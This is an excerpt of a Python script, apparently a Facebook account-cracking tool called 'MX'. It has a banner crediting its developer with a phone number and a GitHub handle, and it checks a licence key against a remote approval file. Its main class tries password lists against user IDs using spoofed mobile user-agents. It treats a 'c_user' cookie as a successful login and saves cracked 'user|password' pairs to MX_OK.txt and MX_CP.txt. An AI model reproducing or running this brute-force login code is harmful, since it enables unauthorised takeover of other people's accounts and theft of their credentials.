...
\033[1;91m ║║║║║║╔═╗║║║║║║╚═╝║║─║║╠═╦╝╔╗╚╗
\033[1;91m ╚╝╚╝╚╩╝─╚╩╝╚╝╚╩═══╩╝─╚═╝─╚═╝╚═╝
\033[1;92m            [+] I LOVE BANGLADESH [+]
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :        M A M U N
     \033[1;91m➣ \033[1;91mFACEBOOK   :        ﾞMood　一　Offﾞ　Stay ﾞxﾞ Alert十
     \033[1;92m➣ \033[1;92mWHATSAPP   :        01304906886
     \033[1;91m➣ \033[1;91mGITHUB     :        mamun0404
...
a=requests.get("https://raw.githubusercontent.com/mamun0404/MX-FILE/main/Approval.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mMX_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mMX_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back MX Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;37m[MX] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.7.0.6",
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/326.0.0.18.97;]",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MX-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MX_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MX-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MX_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print('\033[1;31m Cracking Started...')
            print("\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
